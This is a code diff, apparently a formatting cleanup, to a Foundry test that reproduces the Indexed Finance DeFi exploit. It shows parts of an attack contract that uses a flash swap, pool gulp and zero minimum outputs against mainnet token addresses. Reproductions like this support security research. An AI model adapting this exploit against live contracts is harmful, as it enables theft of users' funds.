@@ -12,10 +12,13 @@ import "forge-std/Test.sol";
 // Attack tx: https://etherscan.io/tx/0x44aad3b853866468161735496a5d9cc961ce5aa872924c5d78673076b1cd95aa
 
 interface IUniswapV2Callee {
+
     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
+
 }
 
 contract BNum {
+
     uint256 internal constant BONE = 10 ** 18;
 
     // Maximum ratio of input tokens to balance for swaps.
@@ -29,9 +32,11 @@ contract BNum {
         uint256 c2 = c1 / BONE;
         return c2;
     }
+
 }
 
 contract IndexedAttack is BNum, IUniswapV2Callee, Test {
+
     address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
     address private constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
     address private constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
@@ -238,7 +243,7 @@ contract IndexedAttack is BNum, IUniswapV2Callee, Test {
         IIndexPool indexPool = IIndexPool(DEFI5);
         indexPool.gulp(SUSHI);
 
-        uint256[] memory minAmountOut = new uint[](7);
+        uint256[] memory minAmountOut = new uint256[](7);
         for (uint256 i = 0; i < 7; i++) {
             minAmountOut[i] = 0;
         }
@@ -299,17 +304,21 @@ contract IndexedAttack is BNum, IUniswapV2Callee, Test {
         console.log("SNX %s", IERC20(SNX).balanceOf(address(this)) / 1e18);
         console.log("SUSHI %s", IERC20(SUSHI).balanceOf(address(this)) / 1e18);
     }
+
 }
 
 /* -------------------- Interface -------------------- */
 interface IERC20 {
+
     function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
     function balanceOf(address account) external view returns (uint256);
     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
 }
 
 interface IIndexPool {
+
     function joinswapExternAmountIn(
         address tokenIn,
         uint256 tokenAmountIn,
@@ -333,24 +342,32 @@ interface IIndexPool {
     function getTotalDenormalizedWeight() external view returns (uint256);
 
     function getBalance(address token) external view returns (uint256);
+
 }
 
 interface IMarketCapSqrtController {
+
     function updateMinimumBalance(IIndexPool pool, address tokenAddress) external;
     function reindexPool(address poolAddress) external;
+
 }
 
 interface IUniswapV2Pair {
+
     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
     function token0() external view returns (address);
     function token1() external view returns (address);
+
 }
 
 interface IUniswapV2Factory {
+
     function getPair(address tokenA, address tokenB) external view returns (address pair);
+
 }
 
 interface IUniswapV2Router01 {
+
     function swapTokensForExactTokens(
         uint256 amountOut,
         uint256 amountInMax,
@@ -358,4 +375,5 @@ interface IUniswapV2Router01 {
         address to,
         uint256 deadline
     ) external returns (uint256[] memory amounts);
+
 }
